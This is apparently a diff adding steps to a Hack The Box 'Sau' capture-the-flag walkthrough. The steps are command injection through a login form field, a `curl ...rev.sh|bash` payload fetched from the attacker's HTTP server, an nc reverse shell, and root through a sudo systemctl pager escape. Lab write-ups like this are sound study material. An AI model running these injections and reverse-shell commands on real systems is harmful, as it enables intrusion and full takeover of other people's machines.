@@ -47,23 +47,80 @@ https://github.com/entr0pie/CVE-2023-27163
 
 https://notes.sjtu.edu.cn/s/MUUhEymt7#
 
-![image](https://github.com/Rogue-1/HTB/assets/105310322/d6883732-b52e-42ae-ad90-b7f701785ad8)
 
 
+![image](https://github.com/Rogue-1/HTB/assets/105310322/eb39e2e0-55e6-4fd4-9042-95e0c8daf323)
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/b72b6235-9bc6-4c77-b69e-4429b229ddae)
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/ca3f4c9e-cb08-4f35-bde2-69d220cba015)
+
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/c9306149-ddb9-40d8-9ac0-0db22caa475e)
+
+```
+└──╼ [★]$ curl -X POST --data 'username=;`curl -X POST http://10.129.166.37:55555/2nv68gc/login --data "$(id)"`' http://10.129.166.37:55555/2nv68gc/login
+```
+
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/15b37510-cde2-481c-bfb5-3a28f66a5000)
+
+
+
+```
+└──╼ [★]$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.166.37 - - [25/Jul/2023 20:51:58] "GET /rev.sh HTTP/1.1" 200 -
+```
+
+
+```
+└──╼ [★]$ curl -X POST --data 'username=;`curl -X POST http://10.129.166.37:55555/2nv68gc/login --data "$(curl http://10.10.14.78:8000/rev.sh|bash)"`' http://10.129.166.37:55555/2nv68gc/login
+```
+
+
+```
 └──╼ [★]$ nc -lvnp 1234
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
 Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 10.129.229.26.
-Ncat: Connection from 10.129.229.26:33344.
-GET /test5 HTTP/1.1
-Host: 10.10.14.78:1234
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.5
-Dnt: 1
-Sec-Gpc: 1
-Upgrade-Insecure-Requests: 1
-X-Do-Not-Forward: 1
+Ncat: Connection from 10.129.166.37.
+Ncat: Connection from 10.129.166.37:44844.
+sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(puma) gid=1001(puma) groups=1001(puma)
+$ 
 
+
+$ cat user.txt
+c9d8f5bbb***********************
+```
+
+```
+$ sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+```
+$ script /dev/null /bin/bash
+Script started, file is /dev/null
+puma@sau:/opt/maltrail$ sudo systemctl status trail.service
+sudo systemctl status trail.service
+WARNING: terminal is not fully functional
+-  (press RETURN)!sh
+!sshh!sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```
+# cat /root/root.txt
+cat /root/root.txt
+c5135dea66**********************
+**********
+```
